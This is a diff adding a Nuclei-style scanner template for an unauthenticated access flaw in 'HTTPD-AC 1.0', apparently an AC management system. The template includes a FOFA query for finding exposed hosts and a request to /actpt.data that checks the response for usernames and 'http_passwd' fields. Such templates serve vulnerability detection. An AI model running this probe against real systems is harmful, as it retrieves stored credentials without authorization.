@@ -1,0 +1,23 @@
+id: HTTPD-AC-unauth
+
+info:
+  name: 智能AC管理系统HTTPD-AC 1.0服务存在未授权访问
+  author: HTTPD
+  severity: high
+  metadata: 
+    fofa-query: header="HTTPD_ac 1.0"
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+http:
+  - raw:
+      - |
+        GET /actpt.data HTTP/1.1
+        Host:{{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/124.0
+
+
+    matchers:
+          - type: dsl
+            dsl:
+               - status_code==200 && contains_all(body,"username","http_passwd")
